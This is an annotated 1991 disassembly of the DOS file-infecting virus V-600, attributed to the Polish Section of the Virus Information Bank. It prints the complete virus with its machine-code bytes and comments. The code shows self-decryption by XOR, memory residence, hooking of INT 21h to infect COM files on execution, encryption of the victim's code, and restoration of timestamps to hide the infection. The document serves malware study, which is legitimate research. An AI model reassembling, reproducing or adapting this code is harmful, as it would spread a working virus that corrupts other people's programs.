;================================================
; Virus V-600
;
; Disassembled by Andrzej Kadlof 1991, September
;
; (C) Polish Section of Virus Information Bank
;================================================

; wirus entry point

0100 BE1001         MOV     SI,0110     ; offset of encrypted block
0103 B93200         MOV     CX,0032     ; block size

0106 8A24           MOV     AH,[SI]     ; get byte
0108 80F4DD         XOR     AH,DD       ; decrypt
010B 8824           MOV     [SI],AH     ; store back
010D 46             INC     SI          ; next byte
010E E2F6           LOOP    0106        ; continue

; check virus presence in memory

0110 B4AB           MOV     AH,AB       ; new subfunction
0112 CD21           INT     21

0114 3D5555         CMP     AX,5555     ; expected answer
0117 7503           JNZ     011C        ; no virus active in RAM

0119 E98E00         JMP     01AA        ; exit to COM

; install virus in RAM

011C 8CC8           MOV     AX,CS       ; segment of PSP
011E 2D0100         SUB     AX,0001
0121 8ED8           MOV     DS,AX       ; segment of MCB
0123 BB0300         MOV     BX,0003     ; block size in paragraphs
0126 3E8B07         MOV     AX,DS:[BX]  ; get block size
0129 2D8000         SUB     AX,0080     ; resereve 800h bytes for virus (2048)
012C 3E8907         MOV     DS:[BX],AX  ; store new size

012F 0E             PUSH    CS          ; restore DS
0130 1F             POP     DS
0131 BB0200         MOV     BX,0002     ; memory size in PSP
0134 8B07           MOV     AX,[BX]     ; get it
0136 2D8000         SUB     AX,0080     ; decrease by 800h bytes
0139 8907           MOV     [BX],AX     ; store it back in PSP

; move virus to new place

013B 8EC0           MOV     ES,AX       ; new segment for virus
013D BF0000         MOV     DI,0000     ; destination offset
0140 BE0000         MOV     SI,0000     ; source offset
0143 B90008         MOV     CX,0800     ; block length
0146 F3A4           REPZ    MOVSB       ; move

0148 8BD0           MOV     DX,AX       ; store virus segment in DX
014A EB2E           JMP     017A        ; continue installation
014C 90             NOP

;================
; INT 21h handler

014D FB             STI
014E 80FCAB         CMP     AH,AB       ; virus question for resident part
0151 7504           JNZ     0157        ; no

0153 B85555         MOV     AX,5555     ; answer: I'm here!
0156 CF             IRET

; check for 4B00h subfunction

0157 50             PUSH    AX
0158 FEC4           INC     AH          ; do not test 4B00 ...
015A 3D004C         CMP     AX,4C00     ; openly
015D 58             POP     AX
015E 7515           JNZ     0175        ; exit

; subfunction is 4B00 (load and execute)

0160 9C             PUSHF
0161 50             PUSH    AX
0162 53             PUSH    BX
0163 51             PUSH    CX
0164 52             PUSH    DX
0165 56             PUSH    SI
0166 57             PUSH    DI
0167 06             PUSH    ES
0168 1E             PUSH    DS
0169 E99E00         JMP     020A        ; try infect if COM

; jump to old INT 21h

016C 1F             POP     DS
016D 07             POP     ES
016E 5F             POP     DI
016F 5E             POP     SI
0170 5A             POP     DX
0171 59             POP     CX
0172 5B             POP     BX
0173 58             POP     AX
0174 9D             POPF
0175 EA1C02BC12     JMP     12BC:021C

;      ^^^^^^^^  place holder for old INT 21h

; continue installation virus in memory
; first intercepte INT 21h

017A 8EDA           MOV     DS,DX       ; virus segment
017C B82135         MOV     AX,3521     ; get INT 21h
017F CD21           INT     21

; store old INT 21h (this modify virus code)

0181 3E891E7601     MOV     DS:[0176],BX
0186 3E8C067801     MOV     DS:[0178],ES
018B 3E891E4202     MOV     DS:[0242],BX
0190 3E8C064402     MOV     DS:[0244],ES

; few bytes of useless code

0195 1E             PUSH    DS          ; store new virus segment
0196 8CC0           MOV     AX,ES       ; waste of time
0198 8ED8           MOV     DS,AX       ; waste of time
019A 8BD3           MOV     DX,BX       ; waste of time
019C 1F             POP     DS          ; restore DS

; set new INT 21h

019D 8D164D01       LEA     DX,[014D]   ; offset of new INT 21h
01A1 B82125         MOV     AX,2521     ; set INT 21h
01A4 CD21           INT     21

; restore ES and DS

01A6 0E             PUSH    CS
01A7 1F             POP     DS
01A8 1E             PUSH    DS
01A9 07             POP     ES

; exit to COM file

01AA BED401         MOV     SI,01D4     ; offset of decryption routine
01AD B90001         MOV     CX,0100     ; size of block
01B0 BBEC01         MOV     BX,01EC     ; place holder for file size
01B3 8B3F           MOV     DI,[BX]     ; file size
01B5 83FF00         CMP     DI,+00      ; ??
01B8 7502           JNZ     01BC

; imediately exit to DOS

01BA CD20           INT     20          ; terminate

; continue restoring COM file

01BC 57             PUSH    DI          ; store file size
01BD BBEE01         MOV     BX,01EE     ; place holder for virus length
01C0 8B07           MOV     AX,[BX]     ; virus length
01C2 01C7           ADD     DI,AX       ; and of file (disk)
01C4 81C70001       ADD     DI,0100     ; size of PSP
01C8 FC             CLD
01C9 57             PUSH    DI          ; destination
01CA F3A4           REPZ    MOVSB       ; copy part of virus and victim code
01CC 5F             POP     DI          ; restore destination
01CD 58             POP     AX          ; file size
01CE 8B0EEE01       MOV     CX,[01EE]   ; virus length
01D2 57             PUSH    DI          ; jump to moved code
01D3 C3             RET                 ; here jump to 1D4h

01D4 050001         ADD     AX,0100     ; offset of moved block
01D7 8BF0           MOV     SI,AX       ; source
01D9 BF0001         MOV     DI,0100     ; destination
01DC FC             CLD
01DD 8A04           MOV     AL,[SI]     ; get byte
01DF 34BB           XOR     AL,BB       ; decrypt
01E1 8805           MOV     [DI],AL     ; move back to begin of file
01E3 46             INC     SI
01E4 47             INC     DI
01E5 E2F6           LOOP    01DD

01E7 B80001         MOV     AX,0100     ; offset of entry point
01EA 50             PUSH    AX          ; prepare jump
01EB C3             RET                 ; jump to COM

; working area

01EC  58 02             ; oryginal file size
01EE  58 02             ; virus length
01F0  56 05 E0 0F       ; old INT 24h

; unused block

; encrypted string (XOR 1Ah) 'Oleynikoz', 0, 'S.,1990', 0, 0, 0, 0 

01F5  55 76 7F 63 74 73 71 75 60 00 49 34    Uv.ctsqu`.I4
0200  36 2B 23 23 2A 00 00 00 00             6+##*....

;===================
; INT 24h handler

0209 CF             IRET

;=============================
; INT 21h AX = 4B00h service

020A 8BDA           MOV     BX,DX       ; waste of time
020C 1E             PUSH    DS
020D 52             PUSH    DX
020E 06             PUSH    ES
020F 0E             PUSH    CS
0210 1F             POP     DS

; intercepte INT 24h

0211 B82435         MOV     AX,3524     ; get INT 24h
0214 CD21           INT     21

0216 891EF001       MOV     [01F0],BX
021A 8C06F201       MOV     [01F2],ES

021E BA0902         MOV     DX,0209     ; offset of new INT 25h
0221 B82425         MOV     AX,2524     ; set INT 24h
0224 CD21           INT     21

0226 07             POP     ES
0227 5A             POP     DX
0228 1F             POP     DS
0229 1E             PUSH    DS
022A 0E             PUSH    CS
022B 1F             POP     DS
022C BB0001         MOV     BX,0100     ; virus base
022F B95803         MOV     CX,0358     ; last virus byte
0232 29D9           SUB     CX,BX       ; virus length
0234 BBEE01         MOV     BX,01EE     ; offset of working varible
0237 890F           MOV     [BX],CX     ; store virus length
0239 1F             POP     DS          ; store offset of file name
023A 8BDA           MOV     BX,DX
023C B8023D         MOV     AX,3D02     ; open file for read/write
023F 9C             PUSHF
0240 FA             CLI
0241 9A1C02BC12     CALL    12BC:021C   ; old INT 21h

;      ^^^^^^^^  place holder for old INT 21h

0246 7306           JAE     024E        ; OK

0248 E8FF00         CALL    034A        ; close file and exit
024B E91EFF         JMP     016C

024E 50             PUSH    AX          ; store handle
024F 8CC8           MOV     AX,CS
0251 8ED8           MOV     DS,AX
0253 8EC0           MOV     ES,AX
0255 58             POP     AX
0256 50             PUSH    AX
0257 8BD8           MOV     BX,AX       ; handle
0259 B80057         MOV     AX,5700     ; get file time/date stamps
025C CD21           INT     21

025E 58             POP     AX
025F 51             PUSH    CX
0260 52             PUSH    DX
0261 50             PUSH    AX

; get file length

0262 8BD8           MOV     BX,AX       ; handle
0264 B90000         MOV     CX,0000
0267 BA0000         MOV     DX,0000
026A B442           MOV     AH,42       ; move file ptr to EOF
026C B002           MOV     AL,02
026E CD21           INT     21
0270 BBEC01         MOV     BX,01EC     ; store file length
0273 8907           MOV     [BX],AX     ; low word
0275 BBEE01         MOV     BX,01EE
0278 8B0F           MOV     CX,[BX]     ; virus length
027A 39C8           CMP     AX,CX       ; check minimum size
027C 7709           JA      0287

; file too short, exit

027E 5B             POP     BX
027F 58             POP     AX
0280 58             POP     AX
0281 E8C100         CALL    0345
0284 E9E5FE         JMP     016C

; continue file examination

0287 3D60EA         CMP     AX,EA60     ; maximum file size
028A 7209           JB      0295        ; OK

; file too long, exit

028C 5B             POP     BX
028D 58             POP     AX
028E 58             POP     AX
028F E8B300         CALL    0345
0292 E9D7FE         JMP     016C

; move file ptr to BOF

0295 B90000         MOV     CX,0000
0298 BA0000         MOV     DX,0000
029B B80042         MOV     AX,4200
029E 5B             POP     BX
029F 53             PUSH    BX
02A0 CD21           INT     21

02A2 BBEE01         MOV     BX,01EE
02A5 8B0F           MOV     CX,[BX]     ; virus length
02A7 5B             POP     BX          ; restore handle
02A8 53             PUSH    BX
02A9 BA5803         MOV     DX,0358     ; buffer above virus code
02AC B43F           MOV     AH,3F       ; read file
02AE CD21           INT     21

02B0 BE5803         MOV     SI,0358     ; first byte of file
02B3 8B0C           MOV     CX,[SI]
02B5 81F9BE10       CMP     CX,10BE     ; virus signature
02B9 7509           JNZ     02C4        ; not infected

; file infected, exit

02BB 5B             POP     BX
02BC 58             POP     AX
02BD 58             POP     AX
02BE E88400         CALL    0345
02C1 E9A8FE         JMP     016C

; skip EXE files

02C4 81F94D5A       CMP     CX,5A4D     ; EXE mark
02C8 7509           JNZ     02D3

; this is EXE file, exit

02CA 5B             POP     BX
02CB 58             POP     AX
02CC 58             POP     AX
02CD E87500         CALL    0345
02D0 E999FE         JMP     016C

; infect clear COM file

02D3 BA0000         MOV     DX,0000
02D6 B90000         MOV     CX,0000
02D9 B80242         MOV     AX,4202     ; move file ptr to EOF
02DC 5B             POP     BX          ; handle
02DD 53             PUSH    BX
02DE CD21           INT     21

02E0 BEEE01         MOV     SI,01EE     ; virus length place holder
02E3 8B0C           MOV     CX,[SI]     ; block size
02E5 B440           MOV     AH,40       ; write file

02E7 51             PUSH    CX          ; store for a while
02E8 BB5803         MOV     BX,0358     ; offset of buffer
02EB 8A07           MOV     AL,[BX]     ; encrypt block
02ED 34BB           XOR     AL,BB
02EF 8807           MOV     [BX],AL
02F1 43             INC     BX
02F2 E2F7           LOOP    02EB

02F4 59             POP     CX          ; block size
02F5 5B             POP     BX          ; handle
02F6 53             PUSH    BX
02F7 BA5803         MOV     DX,0358     ; source buffer
02FA CD21           INT     21          ; write file

02FC B80042         MOV     AX,4200     ; move file ptr to BOF
02FF BA0000         MOV     DX,0000
0302 B90000         MOV     CX,0000
0305 CD21           INT     21

; encrypt part of virus code

0307 BB1001         MOV     BX,0110     ; offset of block
030A B93200         MOV     CX,0032     ; block size
030D 8A27           MOV     AH,[BX]
030F 80F4DD         XOR     AH,DD
0312 8827           MOV     [BX],AH
0314 43             INC     BX
0315 E2F6           LOOP    030D

0317 BEEE01         MOV     SI,01EE
031A 8B0C           MOV     CX,[SI]     ; virus size
031C BA0001         MOV     DX,0100     ; offset of virus code
031F B440           MOV     AH,40       ; write file
0321 5B             POP     BX          ; handle
0322 53             PUSH    BX
0323 CD21           INT     21

; decrypt back own code

0325 BB1001         MOV     BX,0110
0328 B93200         MOV     CX,0032
032B 8A27           MOV     AH,[BX]
032D 80F4DD         XOR     AH,DD
0330 8827           MOV     [BX],AH
0332 43             INC     BX
0333 E2F6           LOOP    032B

; restore file time/date stamps

0335 5B             POP     BX
0336 5A             POP     DX
0337 59             POP     CX
0338 53             PUSH    BX
0339 B80157         MOV     AX,5701
033C CD21           INT     21
033E 5B             POP     BX

; close file and jump to COM

033F E80300         CALL    0345
0342 E927FE         JMP     016C

;--------------------------------
; close file, and restore INT 24h

0345 B8003E         MOV     AX,3E00
0348 CD21           INT     21
034A 8B1EF001       MOV     BX,[01F0]
034E 8E06F201       MOV     ES,[01F2]
0352 B82425         MOV     AX,2524
0355 CD21           INT     21
0357 C3             RET

; end of virus code
;-------------------
; victim code
; ...
